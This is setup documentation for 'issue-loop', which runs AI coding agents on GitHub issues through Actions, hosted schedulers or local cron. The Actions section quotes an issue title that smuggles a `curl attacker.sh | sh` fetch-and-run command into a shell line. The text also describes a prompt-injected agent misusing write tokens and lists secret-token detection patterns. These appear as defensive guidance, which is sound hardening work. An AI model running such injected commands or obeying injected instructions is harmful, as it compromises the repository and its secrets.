# Runners for issue-loop

issue-loop needs something that starts an agent run when a report arrives and again when a verdict appears. Three kinds of runner work. Pick one per automation; most people use the same one for both.

Whichever you pick, the runner owns three security decisions: what token the agent holds, where the app under test runs, and whether the agent's output reaches GitHub or chat directly. The examples below take the strictest workable answer to each, and the text says what you give up if you relax it.

## A. GitHub Actions

### Layout: the agent never holds a write token

Each automation is two jobs. The **agent job** checks out the repository, runs the agent CLI with a read-only `GITHUB_TOKEN` and the model API key, and writes its result to files: a verdict body, a labels list, and for reproduce a patch and PR text. The **publish job** has the write scopes, runs no model, validates those files with a short deterministic script, and posts. A prompt injection that fully controls the agent can then at most produce a bad file, which the validator rejects or a person sees in the reply. It cannot push, label arbitrary issues, or read the write token.

The operational files support this: when the prompt says "write your reply to `out/`", the run writes there instead of calling a reply action, and the publish job performs the post with the same frozen coordinates.

If you collapse the two jobs into one, the agent's process holds `issues: write` (and for reproduce `contents: write` and `pull-requests: write`), and an injected instruction that escapes the prompt rules could use them. Do that only for private repositories where every issue author is trusted.

### Rules for every workflow

- Never interpolate `${{ github.event.issue.title }}`, `.body`, or comment text into a `run:` line. GitHub expands those before the shell sees them, so a title like `"; curl attacker.sh | sh; "` becomes a command. Pass only the issue number through `env:` and let the agent fetch the text itself with `gh issue view`.
- Do not use `pull_request_target`, and do not check out a contributor's branch in a job that has secrets.
- Set `permissions:` at the job level. Start every workflow with `permissions: {}` at the top so a job that forgets its own block gets nothing.
- Pin third-party actions to a full commit SHA. The `@v4` tags in these examples are for readability; replace them with SHAs when you commit.
- Put the model API key in a repository or environment secret. Use a GitHub environment with required reviewers for the reproduce job if you want a person to approve each run before it spends money or opens a PR.
- Set `timeout-minutes` from the config budgets and a `concurrency` group per issue so two runs for the same report never overlap.
- Comments made with the default `GITHUB_TOKEN` do not trigger other workflows. Reproduce therefore polls on a schedule (shown below) or triage posts through a GitHub App token, whose comments do trigger `issue_comment`.

### The publish scripts

The deterministic half lives in the pack's `scripts/` directory. With the default install path the workflows call them as `.issue-loop/pack/scripts/<name>.sh`. Each `.sh` file is a two-line wrapper that runs the `.mjs` file of the same name with Node 18 or later. All three read the person's config from `.issue-loop/config.yaml` (override with `--config <path>` or `ISSUE_LOOP_CONFIG`), take the repository from `REPO` or `GITHUB_REPOSITORY`, call GitHub only through `gh`, and exit 2 when validation refuses the agent's output, so a refused run shows as a failed step. Their tests run with `node --test .issue-loop/pack/scripts/test/*.test.mjs` and use a fake `gh` on `PATH`.

| Script | What it checks before writing anything | What it writes |
| --- | --- | --- |
| `publish-verdict.sh <out> <issue>` | `out/verdict.md` exists, is UTF-8 under 16 KB, not a symlink, ends in exactly one configured marker, and mentions the marker prefix nowhere else; no token-shaped strings (`ghp_`, `github_pat_`, `sk-`, `xox?-`, `AKIA`, private-key blocks, JWTs, long mixed-case base64 runs); `out/labels.txt` names only configured labels that agree with the marker; `out/tracker.json`, if present, is an object with known keys and the tracker is not GitHub Issues; the issue is open and has no trusted verdict yet. | One `gh issue comment --body-file`, then `gh issue edit --add-label`. It re-reads the comments to confirm the verdict landed under the configured triage identity. |
| `find-trusted-verdict.sh` | Open issues updated in the last 24 hours (or only `MANUAL=<n>`). A candidate needs a verdict comment whose author login equals `intake.triage_identity` (and whose numeric account ID equals `intake.triage_identity_id` when set), whose last line is one marker, all such verdicts agreeing on `bug` or `performance`, and no status label past `seen`. Comment text never grants trust. | Prints `issue=<n>` and `kind=<kind>` for `$GITHUB_OUTPUT`, or `issue=`. |
| `publish-repro.sh <out> <issue>` | `out/status.txt` holds one configured status key; `out/reply.md` has no marker text and no secrets; `out/patch.diff`, if present, comes with status `pr_opened`, `out/pr.md`, and at least one `out/proof/before*` and `out/proof/after*`. The patch may not touch `.github/`, `.issue-loop/`, any lockfile outside `repository.lockfile_allowlist`, files that usually hold secrets (`.env*`, `*.pem`, `.npmrc`, ...), symlinks, binaries, or paths that escape the repository, and its added lines are scanned for secrets. The issue is open and carries one trusted bug or performance verdict. Refuses outright if `repository.draft_only` is false. | Branch `issue-loop/<n>` from `origin/<default_branch>`, `git apply --index`, one commit, push, then `gh pr create --draft`. Then the status label (stale status labels removed) and at most one reply, tagged so a rerun does not repeat it. A failed push or PR sets `fix_failed`. |

None of the scripts reads an issue number from the agent's files. The workflow passes it from the event payload or the `pick` job.

Set `intake.triage_identity` to the account the publish job's token posts as. With the default `GITHUB_TOKEN` that is `github-actions[bot]`. A dedicated GitHub App gives a distinct login, which matters when other workflows in the repository also comment.

### Triage workflow (Claude Code)

```yaml
# .github/workflows/issue-loop-triage.yml
name: issue-loop triage
on:
  issues:
    types: [opened]
permissions: {}

jobs:
  analyze:
    if: ${{ !contains(github.event.issue.labels.*.name, 'wontfix') }}
    runs-on: ubuntu-latest
    timeout-minutes: 20
    concurrency: issue-loop-${{ github.event.issue.number }}
    permissions:
      contents: read
      issues: read
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 200 }
      - uses: actions/setup-node@v4
        with: { node-version: 22 }
      - run: npm install -g @anthropic-ai/claude-code
      - name: Run triage
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          GH_TOKEN: ${{ github.token }}          # read-only in this job
          ISSUE_NUMBER: ${{ github.event.issue.number }}
          REPO: ${{ github.repository }}
        # Flags checked against https://code.claude.com/docs/en/cli-reference
        # and rule syntax against https://code.claude.com/docs/en/permissions :
        #   -p runs headless and exits; --max-turns and --output-format apply
        #   only in print mode. --tools limits which built-in tools exist;
        #   --allowedTools pre-approves calls; --permission-mode dontAsk denies
        #   every call that is not pre-approved instead of waiting for a prompt.
        #   File writes are matched by Edit(path) rules (Write(path) rules never
        #   match), and "Bash(cmd *)" is the documented prefix form.
        run: |
          mkdir -p out
          claude -p "$(envsubst < .issue-loop/triage-prompt.txt)" \
            --tools "Read,Edit,Write,Bash" \
            --allowedTools "Read,Edit(out/**),Bash(gh issue view *),Bash(gh issue list *),Bash(gh search issues *),Bash(gh pr list *),Bash(git log *),Bash(git show *),Bash(git grep *)" \
            --permission-mode dontAsk \
            --max-turns 60 \
            --output-format json > triage-run.json
      - uses: actions/upload-artifact@v4
        with: { name: verdict, path: out/ }

  publish:
    needs: analyze
    runs-on: ubuntu-latest
    timeout-minutes: 5
    permissions:
      issues: write
    steps:
      - uses: actions/checkout@v4
        with: { sparse-checkout: .issue-loop }
      - uses: actions/download-artifact@v4
        with: { name: verdict, path: out/ }
      - name: Validate and post
        env:
          GH_TOKEN: ${{ github.token }}
          REPO: ${{ github.repository }}
          ISSUE_NUMBER: ${{ github.event.issue.number }}
        run: .issue-loop/pack/scripts/publish-verdict.sh out "$ISSUE_NUMBER"
```

`.issue-loop/triage-prompt.txt` is the live prompt built from `templates/triage-prompt.md`, with `$ISSUE_NUMBER` and `$REPO` as the only substitutions and `<out-dir>` set to `out/`. `Edit(out/**)` is the path rule Claude Code checks for every file modification, including the Write tool, so writes outside `out/` are denied in `dontAsk` mode. Do not add a bare `Write` or `Edit` entry, because a rule without a path approves that tool everywhere. Leave out any rule that approves arbitrary shell. `triage-run.json` holds the run's final result and usage; it stays outside `out/` so the publisher never sees it. Flag spellings change between releases, so check `claude --help` on the version you install.

### Triage with Codex or Gemini CLI

Only the install and run steps change. The publish job stays the same.

```yaml
      # Codex. Checked against https://developers.openai.com/codex/noninteractive
      # (now served at https://learn.chatgpt.com/docs/non-interactive-mode):
      #   `codex exec "<task>"` runs headless; it defaults to a read-only
      #   sandbox and `--sandbox workspace-write` allows edits in the checkout.
      #   `--full-auto` is no longer supported. The docs recommend
      #   CODEX_API_KEY scoped to the one step, not a job-level variable.
      # Network: https://learn.chatgpt.com/docs/agent-approvals-security says
      #   workspace-write keeps network access off unless
      #   sandbox_workspace_write.network_access is true; `-c key=value`
      #   overrides config (https://developers.openai.com/codex/cli/reference).
      #   Triage needs it for `gh`; the token in this job is read-only.
      - run: npm install -g @openai/codex
      - name: Run triage
        env:
          CODEX_API_KEY: ${{ secrets.OPENAI_API_KEY }}
          GH_TOKEN: ${{ github.token }}
          ISSUE_NUMBER: ${{ github.event.issue.number }}
          REPO: ${{ github.repository }}
        run: |
          mkdir -p out
          codex exec --sandbox workspace-write \
            -c sandbox_workspace_write.network_access=true \
            "$(envsubst < .issue-loop/triage-prompt.txt)"
```

```yaml
      # Gemini CLI. Checked against https://geminicli.com/docs/cli/cli-reference/
      # and https://geminicli.com/docs/cli/headless/ : `-p` forces
      # non-interactive mode, `--output-format` takes text, json or
      # stream-json, `--allowed-tools` and `--yolo` are deprecated.
      # Tool approval comes from the Policy Engine
      # (https://geminicli.com/docs/reference/policy-engine/): in
      # non-interactive mode an "ask_user" decision is treated as "deny", and
      # workspace policies under .gemini/policies are not applied yet, so the
      # rules go in the user tier at ~/.gemini/policies/.
      - run: npm install -g @google/gemini-cli
      - name: Write tool policy
        run: |
          mkdir -p ~/.gemini/policies
          cat > ~/.gemini/policies/issue-loop.toml <<'EOF'
          [[rule]]
          toolName = "run_shell_command"
          commandPrefix = ["gh issue view", "gh issue list", "gh search issues", "gh pr list", "git log", "git show", "git grep"]
          decision = "allow"
          priority = 100

          [[rule]]
          toolName = "write_file"
          argsPattern = '"file_path":"(\./)?out/[^"]*"'
          decision = "allow"
          priority = 100
          EOF
      - name: Run triage
        env:
          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
          GH_TOKEN: ${{ github.token }}
          ISSUE_NUMBER: ${{ github.event.issue.number }}
          REPO: ${{ github.repository }}
        run: |
          mkdir -p out
          gemini -p "$(envsubst < .issue-loop/triage-prompt.txt)" --output-format json > triage-run.json
```

The two sandboxes differ. Codex's `workspace-write` mode confines file writes to the checkout, and turning network on is what lets the agent reach GitHub. Gemini CLI has no sandbox in this example; the policy file allows the listed command prefixes and writes into `out/`, and every other call that would need approval is denied because nobody can answer a prompt in a headless run. Check that the `write_file` argument pattern matches the paths your Gemini version sends (run once with `--output-format stream-json` and read the `tool_use` events), because an absolute path would not match it. In both cases the token in the job is read-only, which is the control that limits damage. Confirm flag names with each CLI's `--help` after upgrading.

### Reproduce workflow (scheduled poll)

```yaml
# .github/workflows/issue-loop-reproduce.yml
name: issue-loop reproduce
on:
  schedule:
    - cron: "*/30 * * * *"
  workflow_dispatch:
    inputs:
      issue: { description: Issue number, required: true }
permissions: {}

jobs:
  pick:
    runs-on: ubuntu-latest
    permissions: { issues: read }
    outputs:
      issue: ${{ steps.find.outputs.issue }}
    steps:
      - uses: actions/checkout@v4
        with: { sparse-checkout: .issue-loop }
      - id: find
        env:
          GH_TOKEN: ${{ github.token }}
          REPO: ${{ github.repository }}
          MANUAL: ${{ inputs.issue }}
        run: .issue-loop/pack/scripts/find-trusted-verdict.sh >> "$GITHUB_OUTPUT"

  reproduce:
    needs: pick
    if: needs.pick.outputs.issue != ''
    runs-on: ubuntu-latest
    timeout-minutes: 100
    concurrency: issue-loop-${{ needs.pick.outputs.issue }}
    environment: issue-loop-reproduce        # optional: required reviewers
    permissions:
      contents: read
      issues: read
      pull-requests: read
    container:
      image: ghcr.io/acme/notebook-app-test:latest
      options: --cap-drop=ALL --security-opt no-new-privileges
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - run: npm install -g @anthropic-ai/claude-code
      - name: Run reproduce
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          GH_TOKEN: ${{ github.token }}
          ISSUE_NUMBER: ${{ needs.pick.outputs.issue }}
          REPO: ${{ github.repository }}
          TEST_ACCOUNT_PASSWORD: ${{ secrets.ISSUE_LOOP_TEST_ACCOUNT }}  # sandbox only
        # Same flags as triage (https://code.claude.com/docs/en/cli-reference).
        # The container is the sandbox; the token is read-only, so pushing and
        # posting stay with the publish job.
        run: |
          mkdir -p out
          claude -p "$(envsubst < .issue-loop/reproduce-prompt.txt)" \
            --permission-mode acceptEdits \
            --max-turns 200 \
            --output-format json > repro-run.json
      - uses: actions/upload-artifact@v4
        with:
          name: repro
          path: out/
          retention-days: 2

  publish:
    needs: [pick, reproduce]
    runs-on: ubuntu-latest
    permissions:
      contents: write          # push the issue-loop/<n> branch only
      pull-requests: write     # open a draft PR
      issues: write            # one reply and status labels
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - uses: actions/download-artifact@v4
        with: { name: repro, path: "${{ runner.temp }}/out" }
      - env:
          GH_TOKEN: ${{ github.token }}
          REPO: ${{ github.repository }}
          ISSUE_NUMBER: ${{ needs.pick.outputs.issue }}
        run: .issue-loop/pack/scripts/publish-repro.sh "$RUNNER_TEMP/out" "$ISSUE_NUMBER"
```

The reproduce agent needs a shell to build and drive the app, so its run cannot use the narrow allow-list triage uses. `acceptEdits` approves file edits in the checkout. Add `--allowedTools` entries for the build, test, and control-skill commands your app needs, because in print mode a call that is neither pre-approved nor covered by the mode is not run. The container, the read-only token, and the publish validator are the controls here. The publish job downloads the agent's files to `$RUNNER_TEMP` so they never sit inside the checkout that gets committed. The default branch's protection rule must require a human review, so the draft cannot reach `main` without one.

The test-account secret is for the sandbox app only. Never give the reproduce job a production credential, a deploy key, or a token with `admin` or `workflow` scope.

For Codex or Gemini CLI in the reproduce job, swap the install and run lines as in the triage section, and widen the Gemini policy or the Codex sandbox only as far as building and driving the app requires.

## B. The agent's own scheduler

Some coding agents offer hosted scheduled tasks or automations that start an agent run on a timer, on a new GitHub issue, or on a chat message. If yours does:

1. Use its built-in creation flow, which typically discovers the repository and integrations, shows a draft, and opens an editor for the person to approve. Paste nothing that the flow does not ask for.
2. Give the triage automation the narrowest integration scopes the flow offers: read the repository, read and comment on issues (or read and reply in the one chat channel), and tracker access. Give reproduce the same plus draft PR creation.
3. Confirm the hosted run executes in an isolated environment and find out what credentials it holds. If the hosted runner cannot run your app in a sandbox, keep reproduce on GitHub Actions or a local job and use the scheduler for triage only.
4. Point each automation at its committed operational file by repo-relative path.

If the agent has no such feature, skip this option with a one-line note and use A or C.

## C. Local cron or launchd

Use this when the app needs hardware, a desktop OS, or a network only your machine reaches.

The job runs a script on an interval. The script fetches new reports (`gh issue list --label ... --json number,updatedAt`), keeps a state file of processed issue numbers so a crash or rerun never posts twice, and for each new item starts a container that runs the agent CLI with the prompt.

```bash
#!/usr/bin/env bash
# ~/issue-loop/run-triage.sh
set -euo pipefail
cd "$HOME/src/notebook-app" && git fetch -q origin && git checkout -q origin/main
STATE="$HOME/issue-loop/triaged.txt"; touch "$STATE"
for n in $(gh issue list --state open --search "created:>=$(date -v-1d +%F 2>/dev/null || date -d yesterday +%F)" --json number -q '.[].number'); do
  grep -qx "$n" "$STATE" && continue
  docker run --rm --network issue-loop-net --read-only --tmpfs /tmp \
    --env-file "$HOME/.config/issue-loop/agent.env" \
    -e ISSUE_NUMBER="$n" -v "$PWD:/repo:ro" -v "$HOME/issue-loop/out/$n:/out" \
    issue-loop-agent:latest
  REPO=acme/notebook-app GH_TOKEN="$(security find-generic-password -s issue-loop-publish -w 2>/dev/null || secret-tool lookup service issue-loop-publish)" \
    .issue-loop/pack/scripts/publish-verdict.sh "$HOME/issue-loop/out/$n" "$n" --config .issue-loop/config.yaml
  echo "$n" >> "$STATE"
done
```

`agent.env` is `chmod 600`, lives outside the repository, and holds only the model API key and a read-only GitHub token. The publish step uses a separate token with `issues: write` read from the OS keychain. The `issue-loop-net` Docker network allows egress only to the model API, GitHub, and your test environment.

Schedule it with cron:

```
*/10 * * * * $HOME/issue-loop/run-triage.sh >> $HOME/issue-loop/triage.log 2>&1
```

or launchd on macOS (`~/Library/LaunchAgents/io.endostack.issue-loop.triage.plist`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>io.endostack.issue-loop.triage</string>
  <key>ProgramArguments</key><array><string>/bin/bash</string><string>-lc</string><string>$HOME/issue-loop/run-triage.sh</string></array>
  <key>StartInterval</key><integer>600</integer>
  <key>StandardOutPath</key><string>/tmp/issue-loop-triage.log</string>
  <key>StandardErrorPath</key><string>/tmp/issue-loop-triage.log</string>
</dict></plist>
```

Load it with `launchctl load ~/Library/LaunchAgents/io.endostack.issue-loop.triage.plist`. Reproduce uses the same pattern with its own state file, its own prompt, and the container image that runs your app.

A local runner stops when the machine sleeps. Add a staleness check (the newest processed issue is older than the newest open issue by more than an hour) to the log so you notice.
